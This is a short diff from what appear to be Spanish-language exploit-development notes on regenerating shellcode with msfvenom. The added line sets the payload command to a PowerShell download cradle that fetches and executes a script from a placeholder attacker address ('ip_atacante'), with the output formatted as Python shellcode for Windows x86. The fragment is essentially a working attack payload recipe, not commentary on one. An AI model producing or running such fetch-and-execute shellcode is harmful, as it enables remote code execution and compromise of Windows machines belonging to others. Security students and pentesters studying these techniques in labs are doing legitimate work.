@@ -45,7 +45,7 @@ adicionalmente con [[msfvenom]] podemos controlar el comando a ejecutar obviamen
 # Regenerar shellcode limpio
 
 ```sh
-msfvenom -p windows/exec CMD="" \
+msfvenom -p windows/exec CMD="powershell IEX(New-Object Net.WebClient).downloadString('http://ip_atacante/PS.p1')" \
          --platform windows \
          -a x86 \
          -f py \
